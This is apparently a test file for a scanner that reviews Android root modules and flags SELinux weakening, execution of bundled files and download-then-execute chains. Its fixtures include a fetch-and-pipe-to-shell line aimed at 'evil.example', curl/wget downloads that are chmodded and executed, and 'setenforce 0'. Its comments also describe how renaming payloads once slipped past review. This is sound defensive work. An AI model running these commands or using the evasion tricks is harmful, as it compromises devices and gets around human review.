//   P15 —— PerformanC/ReZygisk 的 `webroot/LICENSE:189`
//          `-permissive terms added in accord with section 7 apply to the code;`
//          被判成 SELINUX_TYPE_PERMISSIVE/high。GPL 许可证散文里「permissive … ;」读成策略语句的
//          唯一原因是分支二尾部那个 `(?:\s+[A-Za-z0-9_.\-:]+)*` ——「permissive 后面可以跟任意多个
//          空格分隔的词，只要整段以 ; 收尾」。SELinux 的一条语句不会含空格隔开的散文，所以删掉它，
//          不加分支、不加谓词（加一条豁免就少一条能咬人的形状）。
//          分支一（`^\s*(?:type)?permissive …`，本来就不要求 `;`）一个字没动 ⇒ 行首多类型写法仍由它接住。
//   P11 —— 「把 `cls.others` 也接进扫描面」那一行（scan.mjs 的 `.concat(cls.others || [])`）本轮实测否决，
//          已回退：扩面之后 `sh $MODDIR/payload.dat` 那条 EXEC_BUNDLED_FILE/high 会被「目标已在扫描面
//          ⇒ 引用不需要单独发现」的撤销判据撤掉，整包从 high/block 掉到 low/auto-approve。
//          P15 单独上今天什么都不改变（`LICENSE` 不在扫描面里），所以本轮只落 P15。
//          —— 以上是第 7 轮的记录，原文照留。Task 2.7（fix10-P11）按它当时的结论把「撤销判据」拆出来
//          之后重做了扩面：feed（谁被扫）与 covered（能不能撤）不再是同一个集合，那一行现在在
//          `scan.mjs` 里，下面那颗反撤销钉跟着改成钉新的真话。
//
// 已知限度（如实钉在下面第 3 条里，不当成已解决）：行中且一行多类型不带花括号
// （`x=1; permissive su_t magisk_t;`）本轮起不再命中；`/* permissive layout; */` 这种
// 「一个词 + 分号」的 CSS/JS 注释仍然命中。逐条见任务报告「残余限度」。

const hitsP15 = (id, file, line) => RULES_BY_ID[id].scan(file, line);

test('P15：许可证散文里的 "permissive … ;" 不算 SELinux 语句（实测曾送出一条 high）', () => {
  for (const [file, line] of [
    ['webroot/LICENSE', '-permissive terms added in accord with section 7 apply to the code;'],
    ['webroot/LICENSE', 'and permissive terms applies to the work;'],
    ['config.toml', 'description = "redistributable under terms; permissive licensing applies;"'],
  ]) {
    assert.equal(hitsP15('SELINUX_TYPE_PERMISSIVE', file, line).length, 0, `许可证/配置散文不该命中：${line}`);
  }
});

test('P15：策略语句的形状一个都不许放过（含 P7 decoy 与 P14 锚点闭包两类写法）', () => {
  for (const [file, line] of [
    ['sepolicy.rule', 'permissive su_t;'],
    ['sepolicy.rule', 'typepermissive su;'],
    ['sepolicy.rule', 'permissive magisk;'],
    ['sepolicy.rule', 'permissive { su magisk };'],
    ['sepolicy.rule', 'typepermissive untrusted_app;'],
    ['sepolicy.rule', 'permissive su_t magisk_t;'],           // 行首那支不要求 ;
    ['service.sh', 'x=1; typepermissive su;'],
    ['service.sh', 'echo "本模块不 typepermissive su;"; typepermissive su;'],
    ['service.sh', 'MODDIR=${0%/*}; typepermissive su;'],
    ['service.sh', 'typepermissive su; # 行尾说明'],
  ]) {
    const h = hitsP15('SELINUX_TYPE_PERMISSIVE', file, line);
    assert.equal(h.length, 1, `必须恰好一条：${file} << ${line}`);
    assert.equal(h[0].severity, 'high', `permissive 仍然是 high：${line}`);
  }
});

test('P15 已知限度（如实钉住，不许日后当「顺手简化」把它放回去）：行中且一行多类型不带花括号', () => {
  assert.equal(hitsP15('SELINUX_TYPE_PERMISSIVE', 'service.sh', 'x=1; permissive su_t magisk_t;').length, 0,
    '打桩前 1 条、打桩后 0 条：这是本轮唯一一处「认得出的合法写法变严不起来」的地方');
  assert.equal(hitsP15('MAGISK_POLICY_LIVE', 'service.sh', 'magiskpolicy --live "permissive su"').length, 1,
    'permissive 走命令行那条路必须有另一条规则说话 —— 这条线不是裸奔');
});

// ---------------------------------------------------------------------------
// 反 P11 撤销钉：扩扫描面不许把「目标已在扫描面 ⇒ 这条引用不需要单独发现」变成全哑
// ---------------------------------------------------------------------------
// 扩扫描面必须同时收缩 covered 集 —— 见 Task 2.7（扩扫描面必须带 covered 集收缩）。
// Task 2.7（fix10-P11）落地后，这颗钉子跟着改成钉新的真话，两件东西不许跟着松：
// (a) `others` 现在**在**扫描面上（BASE 实测：那一格 0 条发现 / low / auto-approve，本轮闭掉）；
// (b) 载荷名字像数据、内容无规则命中时，那条 EXEC_BUNDLED_FILE/high 仍然不许被撤销 ——
//     证人是 finding 自己（载荷已在 feed 上，所以 escalated 为空是正确结果，不是证人丢了）。

test('反 P11 撤销钉：名单外文本已被扩面读掉，且读掉它撤销不掉 EXEC_BUNDLED_FILE/high', () => {
  // (a) 现在的真行为：`stage.dat` 里那行 `setenforce 0` 被逐行扫过了 —— Task 2.7 补的就是这一格。
  //     BASE（`75b76ca`）实测：这个包 0 条发现 / low / auto-approve（引用方与载荷都不像脚本，谁也没读过）。
  const silent = scanZip(makeModuleZip({
    id: 'eval.p11silent',
    files: [
      ['module.prop', moduleProp('eval.p11silent')],
      ['service.sh', '#!/system/bin/sh\necho ready\n'],
      ['stage.dat', 'setenforce 0\n'],
    ],
  }), {});
  assert.ok(silent.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'stage.dat'
    && f.severity === 'high'),
    'stage.dat 现在在扫描面上，`setenforce 0` 必须被逐行读出来（Task 2.7 已闭，不是待补的洞）：'
    + JSON.stringify(silent.findings.map((f) => `${f.ruleId}/${f.severity}@${f.file}:${f.line}`)));
  assert.ok(silent.scripts.some((s) => s.name === 'stage.dat'),
    '它必须在被逐行扫过的文件里：' + JSON.stringify(silent.scripts.map((s) => s.name)));
  assert.equal(silent.riskLevel, 'high', '名单外文本里的载荷不能再安静地留在 low');

  // (b) 要保护的性质：payload.dat 内容无规则命中，整包唯一的发现就是那条引用 —— 撤销它就是整包哑掉。
  const pin = scanZip(makeModuleZip({
    id: 'eval.p11pin',
    files: [
      ['module.prop', moduleProp('eval.p11pin')],
      ['service.sh', '#!/system/bin/sh\nsh $MODDIR/payload.dat\n'],
      ['payload.dat', 'LABEL_ALPHA\nLABEL_BETA\nLABEL_GAMMA\n'],
    ],
  }), { changeType: 'first' });
  const exec = pin.findings.filter((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
  assert.equal(exec.length, 1, JSON.stringify(pin.findings.map((f) => `${f.ruleId}@${f.file}:${f.line}`)));
  assert.equal(exec[0].severity, 'high', '执行一个名字像数据的包内条目必须是 high');
  assert.deepEqual([exec[0].file, exec[0].line], ['service.sh', 2], JSON.stringify(exec[0]));
  assert.equal(pin.findings.length, 1, 'payload.dat 无规则命中：这条引用就是整包唯一的发现');
  // 证人换了落点，不是丢了：载荷已经在 feed 上被逐行读过，所以
  //   * escalated 必须是空 —— escalated 只记「原本不在扫描面、因引用被拉进来的条目」，
  //     为已在面上的条目记一笔就是假账；
  //   * revokedBundledRefs 也必须是空 —— covered 判在扩面之前的五个桶上，这条撤销没有发生，
  //     没发生过的事不许写进撤销记录。
  assert.ok(pin.scripts.some((s) => s.name === 'payload.dat'),
    '载荷必须真被逐行读过（这才是「读过」的证据）：' + JSON.stringify(pin.scripts.map((s) => s.name)));
  assert.deepEqual(pin.escalated, [],
    'payload.dat 本来就在 feed 上：没有升级证人，是记法变了，不是证人没了');
  assert.deepEqual(pin.revokedBundledRefs, [],
    '撤销没有发生：记录里一笔都不许有（有就等于把「读过即无罪」又写回扫描面）');
  assert.notEqual(pin.decision.action, 'auto-approve',
    '首次收录正是「撤销一旦成立就放行」落到的那一档 —— 这条线不许被任何扫描面改动推开');
});

// ---------------------------------------------------------------------------
// Task 2.8（fix8-E）：撤销过就不许走自动通道
// ---------------------------------------------------------------------------
// 洞（§0.13）：applyBundledRefVerdicts() 的 covered 撤销把「扫过且行级规则没命中」当成
// 「读过并且无罪」，而**被执行文件的名字由投稿者挑** —— 改名成 .js/.sh/.lua 就落在扫描面上，
// 撤销成立，首次收录直接 auto-approve；改名成 .dat 才是 high/block。
// 用户拍的是 E 不是 A：撤销照旧（等级、findings 内容、评论噪声一字不动），
// 但每次撤销都要在报告专用字段里留下记录，且发生过撤销的包不许走自动通道 ——
// 代价落在决策上，不落在散文里。
// 硬边界：本任务只把 auto-approve 翻成 request-review；medium/high 的路径一字不改，
// 所以不可能让任何包变得比改动前更容易自动放行。

const E8_PAYLOAD_TEXT = 'just a string table, nothing to run\n';

/** 同一个包，只换被执行条目的名字：这样「名字决定结论」这件事在测试里是可复现的，不是叙述。 */
function e8Zip(id, name, refLine) {
  return makeModuleZip({
    id,
    files: [
      ['module.prop', moduleProp(id)],
      ['service.sh', `#!/system/bin/sh\n${refLine}\n`],
      [name, E8_PAYLOAD_TEXT],
    ],
  });
}

test('fix8-E：载荷改名成 .js/.sh/.lua 骗到撤销后，等级不动但不许再走自动通道（同一个洞的三个名字）', () => {
  for (const name of ['payload.js', 'payload.sh', 'payload.lua']) {
    const r = scanZip(e8Zip('eval.e8disguise', name, `sh $MODDIR/${name}`), { index: [] });
    // 撤销仍然撤销：E 不新增发现、不抬等级、不往 findings[] 里塞 info。
    assert.equal(r.riskLevel, 'low', `${name}：E 不动等级`);
    assert.equal(r.findings.length, 0, `${name}：那条 finding 仍然被撤销，不回到 findings[]`);
    assert.equal(r.counts.info, 0, `${name}：撤销记录不是 findings 里的 info（renderJSON 会连带脱敏）`);
    assert.equal(r.escalated.length, 0, `${name}：本来就在扫描面上，没有升级证人`);
    // 唯一的行为变化：自动通道关上，且只朝更严的方向翻。
    // 这条放在记录断言之前 —— 改前的红应当直接写成 auto-approve ≠ request-review（那个洞本身），
    // 而不是「字段不存在」的 TypeError。
    assert.equal(r.decision.action, 'request-review', `${name}：撤销过就不许自动放行`);
    assert.equal(r.decision.label, 'needs-human-review', name);
    assert.equal(r.decision.needsHumanReview, true, name);
    assert.ok(r.decision.reason.includes(name),
      `${name}：reason 必须指名被撤销的条目，人看得见是哪个文件`);
    // 但撤销不再静默：专用字段里要有指名条目的一笔记录。
    assert.equal(r.revokedBundledRefs.length, 1, `${name}：撤销过一次就要记一笔`);
    const rec = r.revokedBundledRefs[0];
    assert.equal(rec.ruleId, 'EXEC_BUNDLED_FILE', name);
    assert.deepEqual([rec.file, rec.line], ['service.sh', 2], name);
    assert.equal(rec.ref, `sh $MODDIR/${name}`, name);
    assert.equal(rec.resolvedEntry, name, `${name}：记录要写被撤销的那个条目路径`);
    assert.equal(rec.covered, true, name);
    // §2.7 文案纪律：说的是机器不作证，不是把投稿人写成嫌犯。
    for (const w of ['可疑', '恶意', '攻击', '违法', '嫌犯', '绕过']) {
      assert.ok(!r.decision.reason.includes(w), `${name}：reason 不许出现「${w}」—— ${r.decision.reason}`);
    }
  }
});

test('fix8-E 反证：payload.dat 那一格撤销并未发生，记录里不能凭空多出一笔', () => {
  const r = scanZip(e8Zip('eval.e8dat', 'payload.dat', 'sh $MODDIR/payload.dat'), { index: [] });
  const exec = r.findings.filter((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
  assert.equal(exec.length, 1, JSON.stringify(r.findings.map((f) => `${f.ruleId}/${f.severity}`)));
  assert.equal(exec[0].severity, 'high', '这条仍是 high —— E 不靠改等级闭洞');
  assert.equal(r.riskLevel, 'high', JSON.stringify(r.counts));
  assert.equal(r.decision.action, 'block');
  // Task 2.7（fix10-P11）换了这里 instrument 的对象，主张一字没动：
  // 「撤销没有发生 ⇒ 记录里不许有一笔」。发生过的读取代价现在落在 feed 上（载荷被逐行扫过），
  // 而不是落在 escalated 上 —— 后者只记「原本不在扫描面、因引用被拉进来的条目」，
  // 给已经在面上的条目记一笔就是假账。所以两条都必须是空，且都要被钉住。
  assert.deepEqual(r.escalated, [],
    'payload.dat 本来就在 feed 上：没有升级可记。证人换成下面两条 —— 它真被读了，且那条 high 还在');
  assert.ok(r.scripts.some((s) => s.name === 'payload.dat'),
    '载荷必须被逐行扫过（这才是「读过」的证据）：' + JSON.stringify(r.scripts.map((s) => s.name)));
  assert.equal(r.revokedBundledRefs.length, 0,
    '没撤销过的事不许写进撤销记录 —— 反证：记录必须只说发生过的事');
});

test('fix8-E 单元：decide 第三参可选、默认 null；medium/high 与 update/unknown 一字不改（硬边界）', () => {
  const revoked = { revokedCount: 1, revokedEntries: ['payload.js'] };
  assert.equal(decide('low', 'first').action, 'auto-approve', '两参调用保持原样');
  assert.equal(decide('low', 'first', null).action, 'auto-approve', '显式传 null 也照旧');
  assert.equal(decide('low', 'first', { revokedCount: 0, revokedEntries: [] }).action, 'auto-approve',
    '没发生过撤销就照旧放行');
  const d = decide('low', 'first', revoked);
  assert.equal(d.action, 'request-review');
  assert.equal(d.label, 'needs-human-review');
  assert.equal(d.needsHumanReview, true);
  assert.ok(d.reason.includes('payload.js'), JSON.stringify(d));
  // 其余分支必须逐字段不动：撤销记录不给 medium/high 加任何新措辞。
  assert.deepEqual(decide('low', 'update', { revokedCount: 3, revokedEntries: ['a.js', 'b.js'] }),
    decide('low', 'update'), 'update 路径不受影响');
  assert.deepEqual(decide('low', 'unknown', { revokedCount: 3, revokedEntries: ['a.js'] }),
    decide('low', 'unknown'), 'unknown 路径不受影响');
  for (const lv of ['medium', 'high']) {
    for (const ct of ['first', 'update', 'unknown']) {
      assert.deepEqual(decide(lv, ct, { revokedCount: 5, revokedEntries: ['x.js'] }), decide(lv, ct),
        `${lv}/${ct} 带着撤销记录也必须一字不改（它本来就 block）`);
    }
  }
});

test('fix8-E：撤销记录写包内真实条目名，引用里的大小写拼法留在 ref 上；多条撤销逐条记账', () => {
  // 大小写变体：引用写 PAYLOAD.js，包内条目是 payload.js。报告要指认的是被读过的那个条目。
  const lo = scanZip(makeModuleZip({
    id: 'eval.e8case',
    files: [
      ['module.prop', moduleProp('eval.e8case')],
      ['service.sh', '#!/system/bin/sh\nsh $MODDIR/PAYLOAD.js\n'],
      ['payload.js', E8_PAYLOAD_TEXT],
    ],
  }), { index: [] });
  assert.equal(lo.revokedBundledRefs.length, 1, JSON.stringify(lo.revokedBundledRefs));
  assert.equal(lo.revokedBundledRefs[0].resolvedEntry, 'payload.js', '写真实条目名');
  assert.equal(lo.revokedBundledRefs[0].ref, 'sh $MODDIR/PAYLOAD.js', '引用原文照抄，供人工复验');
  assert.equal(lo.decision.action, 'request-review');
  assert.ok(lo.decision.reason.includes('payload.js'), lo.decision.reason);

  // 两条撤销：两个被执行条目各自记账，reason 把两个条目都点名。
  const two = scanZip(makeModuleZip({
    id: 'eval.e8two',
    files: [
      ['module.prop', moduleProp('eval.e8two')],
      ['service.sh', '#!/system/bin/sh\nsh $MODDIR/a.js\n. $MODDIR/b.sh\n'],
      ['a.js', E8_PAYLOAD_TEXT],
      ['b.sh', '#!/system/bin/sh\necho ok\n'],
    ],
  }), { index: [] });
  assert.equal(two.riskLevel, 'low', JSON.stringify(two.findings));
  assert.equal(two.revokedBundledRefs.length, 2, JSON.stringify(two.revokedBundledRefs));
  assert.deepEqual(two.revokedBundledRefs.map((x) => [x.file, x.line, x.resolvedEntry]),
    [['service.sh', 2, 'a.js'], ['service.sh', 3, 'b.sh']], JSON.stringify(two.revokedBundledRefs));
  assert.ok(two.decision.reason.includes('a.js') && two.decision.reason.includes('b.sh'),
    two.decision.reason);
});

test('fix8-E 代价一侧也钉住：标准写法被撤销同样记账转人工，纯包外引用不记撤销', () => {
  // 正经模块的 `sh $MODPATH/verify.sh` 是同一形状的撤销 —— E 承认识别的代价落在决策上，
  // 不写成罪名：首次收录的这一档从此进人工队列（这正是它换掉 A 的理由）。
  const legit = scanZip(makeModuleZip({
    id: 'eval.e8legit',
    files: [
      ['module.prop', moduleProp('eval.e8legit')],
      ['customize.sh', '#!/system/bin/sh\nsh $MODPATH/verify.sh\n'],
      ['verify.sh', '#!/system/bin/sh\necho verified\n'],
    ],
  }), { index: [] });
  assert.equal(legit.riskLevel, 'low', JSON.stringify(legit.findings));
  assert.equal(legit.findings.length, 0, 'E 不给标准写法新增任何发现');
  assert.equal(legit.revokedBundledRefs.length, 1, JSON.stringify(legit.revokedBundledRefs));
  assert.equal(legit.revokedBundledRefs[0].resolvedEntry, 'verify.sh');
  assert.equal(legit.decision.action, 'request-review');
  assert.ok(!/可疑|恶意|绕过|嫌犯/.test(legit.decision.reason), legit.decision.reason);

  // 撤销的另一半：引用指向包外程序时，机器没有替任何**包内条目**作过证，不该记这一笔。
  const external = scanZip(makeModuleZip({
    id: 'eval.e8ext',
    files: [
      ['module.prop', moduleProp('eval.e8ext')],
      ['service.sh', '#!/system/bin/sh\nS="/system/bin/sh"\nsh $S /dev/null\n'],
    ],
  }), { index: [] });
  assert.equal(external.findings.length, 0, JSON.stringify(external.findings));
  assert.equal(external.revokedBundledRefs.length, 0,
    '包外目标不是「被撤销的包内条目」，记进那一栏会让报告说假话');
  assert.equal(external.decision.action, 'auto-approve',
    '没有包内撤销时，自动通道保持今天的样子（E 只关撤销那一格）');
});

test('fix8-E：EXEC_INDIRECT 的撤销在同一条 net 里（变量钉成包内 .js 也要记账、也转人工）', () => {
  // 两条入口共用同一个撤销分支：EXEC_BUNDLED_FILE（字面路径）与 EXEC_INDIRECT（变量间接）。
  // 这条不是推演 —— 若只有字面路径被记，改名 + 变量包装就还留着一条静默通路。
  const r = scanZip(makeModuleZip({
    id: 'eval.e8indirect',
    files: [
      ['module.prop', moduleProp('eval.e8indirect')],
      ['service.sh', '#!/system/bin/sh\nPL="$MODDIR/payload.js"\nsh $PL\n'],
      ['payload.js', E8_PAYLOAD_TEXT],
    ],
  }), { index: [] });
  assert.equal(r.riskLevel, 'low', JSON.stringify(r.findings));
  assert.equal(r.findings.length, 0, '撤销照旧');
  assert.equal(r.revokedBundledRefs.length, 1, JSON.stringify(r.revokedBundledRefs));
  assert.equal(r.revokedBundledRefs[0].ruleId, 'EXEC_INDIRECT', JSON.stringify(r.revokedBundledRefs[0]));
  assert.equal(r.revokedBundledRefs[0].resolvedEntry, 'payload.js');
  assert.equal(r.decision.action, 'request-review');
  assert.ok(r.decision.reason.includes('payload.js'), r.decision.reason);
});

// ---------------------------------------------------------------------------
// Task 2.7（fix10-P11）探针：三个集合不许写成同一个
// ---------------------------------------------------------------------------
// 洞（2026-10-14 在 BASE `75b76ca` 上重新实测，母本同形状）：
// 引用方（config.json）与被引用的载荷（payload.dat）**都不像脚本**时，两者都落在
// SCAN_TARGET_BUCKETS 之外 —— 于是「引用扫描」看不见这条引用，内容扫描也没读过那个载荷，
// 整包 0 发现 / low / auto-approve：这条闸对投稿者自己挑的两个名字同时静默。
//
// 闭法是把一个集合拆成三个（判据 2 与 3 混用的后果 = 同一条 finding 出现两次，
// 它会直接写进公开评论的「命中统计」）：
//   1. feed（内容扫谁）   = 五个桶 ∪ cls.others ∪ 升级条目；
//   2. covered（能撤吗）  = **只有五个桶**（扩面之前）；
//   3. 去重（别推第二遍） = 跟着 feed，不跟着 covered。
// 三条断言一条不多 —— 它们各自钉住上面三行里的一行。
test('Task 2.7 探针：引用方与载荷都在名单外的包，不许走自动通道、证人要在、finding 不许重复', () => {
  const r = scanZip(makeModuleZip({
    id: 'eval.p10probe2',
    files: [
      ['module.prop', moduleProp('eval.p10probe2')],
      ['config.json', '{ "hook": "sh $MODDIR/payload.dat" }\n'],
      ['payload.dat', '#!/system/bin/sh\ncurl http://evil.example/x | sh\n'],
    ],
  }), { changeType: 'first', index: { modules: [] } });
  const keys = r.findings.map((x) => `${x.ruleId}@${x.file}:${x.line}`);
  assert.notEqual(r.decision.action, 'auto-approve', '引用方与载荷都不像脚本的包，不许走自动通道');
  assert.ok(keys.includes('EXEC_BUNDLED_FILE@config.json:1'), '证人必须指名是哪个文件在调用它');
  assert.equal(new Set(keys).size, keys.length, '同一条 finding 不许出现两次（feed 与 covered 混用的后果）');
});

// ===========================================================================
// Task 3 —— 两阶段「下载 → 落盘 → 执行」显式分档（DOWNLOAD_THEN_EXEC）
// ===========================================================================
// 洞（工单 §1，2026-10-14 主控在 0f4ddbe 实测，本会话不重新推演）：
//   curl <url> -o /data/local/tmp/u  ->  chmod 700 <同一路径>  ->  裸路径执行
//   整包 findings 只有 NETWORK_FETCH/low ⇒ low + 首次收录 = **auto-approve**。
// 管道写法（`curl … | sh`）一直由 PIPE_TO_SHELL 咬住 high/block，落盘写法没人说话 ——
// 这条规则闭的就是那一格，而不是新增一档：high/block 与既有管道写法同档。
//
// 断言口径（工单 §3 的要求，不是建议）：每一条夹具都 deepEqual 到**精确的 findings 多重集合**，
// 不写 some(...) 那种存在性断言 —— 存在性断言摘掉一条邻居规则照样绿，而这一节要的是
// 「将来谁把哪一条摘掉/放宽，都在这里当场变红」。反面（不该咬的）同样钉精确集合，
// 因为「0 命中」必须由整包集合一起说话，否则邻居规则新增的 low 也会被读成「什么都没报」。
const T3_SHEBANG = '#!/system/bin/sh';

/** T3 夹具统一的取数口径：一个 service.sh（module.prop 由夹具自动补齐），首次收录。 */
function t3scan(id, body) {
  return scanToReport(makeModuleZip({ id, files: [['service.sh', body]] }), { changeType: 'first' });
}
/** 整份报告的 findings 收成可 deepEqual 的「ruleId/severity」多重集合（排序）。 */
function t3set(r) {
  return r.findings.map((f) => `${f.ruleId}/${f.severity}`).sort();
}
/** 某一条规则在报告里的落点（文件:行/级别），同样排序后可 deepEqual。 */
function t3spots(r, ruleId) {
  return r.findings.filter((f) => f.ruleId === ruleId)
    .map((f) => `${f.file}:${f.line}/${f.severity}`).sort();
}
/** 单条规则在文本层的命中落点（行/级别）。跨行规则的夹具在 scanContent 之下也要钉得住。 */
function t3hits(text, file = 'service.sh') {
  return hits('DOWNLOAD_THEN_EXEC', text, file).map((f) => `${f.line}/${f.severity}`).sort();
}
const t3body = (...lines) => lines.join('\n') + '\n';

// —— 正面 1–6：必须出 1 条 DOWNLOAD_THEN_EXEC/high，且整包 high/block ——

test('T3.1 正面：curl -o 落盘 → chmod → 裸路径执行（工单 §1 那一格，普通域名，不靠域名抬级）', async () => {
  const r = await t3scan('eval.t3a', t3body(T3_SHEBANG,
    'curl https://dl.static-assets.dev/up -o /data/local/tmp/u',
    'chmod 700 /data/local/tmp/u',
    '/data/local/tmp/u &'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:4/high'], '一条链只报一次，报在执行行上');
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low'], 'findings 集合逐条钉死');
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

test('T3.2 正面：wget -P <目录> <url> → sh <目录 + URL basename>（计划没写到的 sink 是目录的形状）', async () => {
  const r = await t3scan('eval.t3b', t3body(T3_SHEBANG,
    'wget -q -P /data/local/tmp https://dl.static-assets.dev/payload',
    'sh /data/local/tmp/payload'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:3/high']);
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

test('T3.3 正面：curl -s <url> > <路径> → sh <路径>（重定向落盘也是 sink）', async () => {
  const r = await t3scan('eval.t3c', t3body(T3_SHEBANG,
    'curl -s https://dl.static-assets.dev/y > /data/local/tmp/y',
    'sh /data/local/tmp/y'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:3/high']);
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

test('T3.4 正面：NAME=绝对路径 → curl -o "$NAME" → 两侧分别用变量与字面量（替换必须是承重的）', async () => {
  // 工单 §3.4 的 `"$D"` 形态在最后一行；倒数第二行用**字面量**执行同一个路径。
  // 两行都留着是有意的：链只报一次，而报的是**最早**那一行 —— 摘掉变量替换时两侧键不再相等，
  // 只剩 `"$D"` ↔ `"$D"` 这条同名链，落点会从第 4 行漂到第 5 行（变异 (c) 就红在这儿）。
  const r = await t3scan('eval.t3d', t3body(T3_SHEBANG,
    'D=/data/local/tmp/p',
    'curl -s https://dl.static-assets.dev/p -o "$D"',
    'sh /data/local/tmp/p',
    '"$D"'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:4/high'],
    '两侧都换成字面值再比：sink 与两个执行形态是同一条链，报最早的执行行');
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

test('T3.5 正面：curl 的 -o 写在续行上也立得住 sink（命令位由逻辑行说话，见 buildLineContexts）', async () => {
  const r = await t3scan('eval.t3e', t3body(T3_SHEBANG,
    'curl \\',
    '-o /data/local/tmp/u \\',
    'https://dl.static-assets.dev/up',
    'chmod 700 /data/local/tmp/u',
    '/data/local/tmp/u'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:6/high'],
    '落地行是 -o 那一行（3），执行行 6 > 3 ⇒ 一条链');
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

test('T3.6 正面：同一 sink 上 chmod + 裸路径 + sh <路径> 三种形态都在 ⇒ 一条链只报一次', async () => {
  const r = await t3scan('eval.t3f', t3body(T3_SHEBANG,
    'curl -s https://dl.static-assets.dev/u -o /data/local/tmp/u',
    'chmod 700 /data/local/tmp/u',
    '/data/local/tmp/u',
    'sh /data/local/tmp/u'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:4/high'],
    '三种执行形态是同一条链：取最早的执行行，只出 1 条');
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.counts.high, 1, '一条链不许把 high 计数抬成 2');
});

// —— 负面 7–13：必须**不出** DOWNLOAD_THEN_EXEC，且整包仍可 auto-approve ——

test('T3.7 负面：只下载不执行（存成数据/资源）保持 low / auto-approve —— 这一格不许被 T3 打进去', async () => {
  const r = await t3scan('eval.t3g', t3body(T3_SHEBANG,
    'curl -s https://x.dev/db.sqlite -o $MODPATH/db.sqlite'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '下载一个数据库文件不是执行链');
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve');
});

test('T3.8 负面：路径只出现在参数位（ls -l / ui_print）不是执行形态', async () => {
  const r = await t3scan('eval.t3h', t3body(T3_SHEBANG,
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'ls -l /data/local/tmp/u',
    'ui_print "/data/local/tmp/u"'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '命令位是 ls / ui_print 时路径只是参数');
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve');
});

test('T3.9 负面：只有 chmod（下载 + chmod，没有执行）不报 —— 已知限度，不许写成已覆盖', async () => {
  const r = await t3scan('eval.t3i', t3body(T3_SHEBANG,
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'chmod 700 /data/local/tmp/u'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [],
    'chmod 644 一个下载来的配置文件是合法形状：单独一条 chmod 不构成执行');
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve', '这一格今天 low、T3 之后仍是 low（工单 §3.9 要求如实列限度）');
});

test('T3.10 负面：sink /data/local/tmp/u 与执行 /data/local/tmp/util 不是同一条链（不许前缀模糊匹配）', async () => {
  const r = await t3scan('eval.t3j', t3body(T3_SHEBANG,
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'sh /data/local/tmp/util'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '前缀相等不等于路径相等');
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve');
});

test('T3.11 负面：-o- / -O - 是标准输出，不立 sink（那一行归 DOWNLOAD_TO_STDOUT）', async () => {
  const r = await t3scan('eval.t3k', t3body(T3_SHEBANG,
    'curl -o- https://dl.static-assets.dev/u',
    'wget -q -O - https://dl.static-assets.dev/u',
    'chmod 700 /data/local/tmp/u',
    '/data/local/tmp/u'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [],
    '标准输出没有落盘点：即使执行路径与被下载内容的 basename 相同也不许配对（不许模糊匹配）');
  assert.deepEqual(t3set(r), ['DOWNLOAD_TO_STDOUT/low', 'DOWNLOAD_TO_STDOUT/low', 'NETWORK_FETCH/low', 'NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve');
});

test('T3.12 负面：执行行早于落地行（先 sh 再 curl -o）不许报', async () => {
  const r = await t3scan('eval.t3l', t3body(T3_SHEBANG,
    'sh /data/local/tmp/u',
    'curl -s https://x.dev/u -o /data/local/tmp/u'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '链的方向必须是「先落盘、后执行」');
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low']);
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve');
});

test('T3.13 干净模块哨兵：无下载无执行的模块仍 0 发现 / low / auto-approve（必须带 changeType）', async () => {
  const r = await t3scan('eval.t3m', t3body(T3_SHEBANG,
    'ui_print "- installing"',
